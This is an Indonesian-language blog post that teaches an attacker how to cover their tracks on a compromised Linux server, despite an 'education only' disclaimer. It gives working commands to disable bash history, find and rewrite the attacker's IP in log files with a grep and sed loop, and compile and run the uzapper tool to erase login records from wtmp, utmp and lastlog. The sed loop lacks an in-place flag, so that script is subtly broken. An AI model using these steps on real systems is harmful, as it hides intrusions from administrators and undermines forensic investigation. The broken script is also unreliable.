---
layout: post
title: Covering Track! Menjadi Hantu pada Linux Server
categories: [Covering Track]
author: Novran Faathir
---

Sesuatu hal yang "SULIT TERDETEKSI" itu memanglah menarik, sama seperti melakukan Covering Tracks.

**Covering Track adalah** upaya untuk menghilangkan jejak setelah melakukan penyerangan terhadap aplikasi maupun Server.

Pada dasarnya seorang Administrator itu akan selalu berurusan dengan yang namanya Log File dan tentunya sebagai Attacker pun harus menghindar dari Log File tersebut.

### REMEMBER: For Education Purpose Only!

Artikel ini hanya untuk pembelajaran saja dan untuk kedepannya mungkin kami akan menulis tentang solusi untuk `Anti Covering Track`-nya juga.

Peran kita disini yaitu sebagai "Attacker" yang sudah melakukan Take-over sebuah Server yang menggunakan sistem operasi Linux, kemudian kita masuk kedalam Shell dari Server tersebut.

# BASH History

**HISTFILE**

HISTFILE adalah sebuah Environment Variable pada Linux yang digunakan untuk mengarahkan sebuah file history yang berisi command-command yang sebelumnya sudah pernah dieksekusi oleh User.

```
user1@linux:~$ echo $HISTFILE
/home/user1/.bash_history
```

```
user1@linux:~$ cat /home/user1/.bash_history
sudo apt-get clean
sudo vi /etc/apt/sources.list
sudo apt-get update
...
```

Supaya aktifitas kita sebagai Attacker tidak tercatat, lebih baik kita arahkan ke `/dev/null`.
```
user1@linux:~$ HISTFILE=/dev/null
user1@linux:~$ echo $HISTFILE
/dev/null
```

Namun ada langkah frustasi, kalau kita lupa mengarahkan BASH History sebelumnya (di-awal).

**Clean History**

```
user1@linux:~$ history -c
```

# Clean Your Public IP from Log File

Hal ini dapat dilakukan kalau kalian memiliki hak akses level "root" karena disini kita akan memanipulasi Log File tentunya.

Pertama-tama ketahuilah IP Public kita sendiri, kita dapat melihatnya melalui website:

<https://www.whatismyip.com/>

**Mencari Log File yang mencatat IP kita**

```
root@linux:~# grep -Rn 'YOUR IP' /var/log/ 2> /dev/null
```

Atau gunakan command di bawah ini untuk mencari LOG keseluruhan (dari root):

```
root@linux:~# grep -Rn 'YOUR IP' / 2> /dev/null
```

**NOTE:** Ubah `YOUR IP` menjadi IP Address kalian.

**Manipulasi IP Address pada Log File**

`Mengapa tidak dihapus saja LOG-nya?`

Jika Log File kita hapus, itu adalah tindakan yang gegabah dan tidak menutup kemungkinan `Administrator` akan melakukan eskalasi ke pihak `Provider`.

**Manipulasi Log**

Disini kita akan menggunakan perintah `sed`.

Contoh:
```
root@linux:~# sed 's/KATA ASLI/KATA GANTI/g' file
```

Supaya lebih cepat memanipulasi IP, kita jadikan script seperti di bawah ini:

```
for LOGFILE in $(grep -Rn 'YOUR IP' / 2> /dev/null | awk -F ':' '{print $1}' | sort -V | uniq)
do
sed 's/YOUR IP/FAKE IP/g' $LOGFILE
done
```

# Stealth from WTMP, UTMP, and Lastlog

- WTMP = mencatat setiap ada yang login/logoff
- UTMP = mencatat siapa yang sedang melakukan akses saat ini
- Lastlog = mencatat source address user yang melakukan login terakhir

**Uzapper Tool**

Tool ini digunakan untuk menghapus log umum pada sistem operasi Solaris, SunOS, IRIX, Linux, FreeBSD.

Kalian dapat unduh pada link di bawah ini:

- <https://packetstormsecurity.com/files/16378/uzapper.c.html>

Untuk melihat siapa yang sedang masuk dan melihat apa yang sedang mereka lakukan (berdasarkan sesi), kalian dapat menggunakan perintah `w`.

```
root@linux:~# w
1:23am up 6:21, 2 users, load average: 0.00, 0.01, 0.02
  User  tty   FROM login@ idle JCPU  PCPU  what
  root  pts/1 :0   2:21am 1    22:39 1.48s w
  user1 pts/2 ???  2:52am 1                -sh
```

Compile Uzapper:
```
root@linux:~# gcc uzapper.c -o uzapper
```

Jalankan Uzapper:
```
root@linux:~# ./uzapper user1
```

Periksa kembali sesi yang aktif:
```
root@linux:~# w
1:23am up 6:21, 2 users, load average: 0.00, 0.01, 0.02
  User  tty   FROM login@ idle JCPU  PCPU  what
  root  pts/1 :0   2:21am 1    22:39 1.48s w
```

**user1** hilang, karena sudah di-wipe menggunakan Uzapper.

# Done!
Artikel tentang Covering Track ini hanya untuk pelajaran saja, pasti banyak yang bertanya-tanya:

```
Kenapa gak pake VPN aja? Biar gak ribet!
```

Silakan dijawab sendiri :)

Terima kasih.

Semoga artikel yang membahas tentang `Covering Track` akan terus berlanjut.
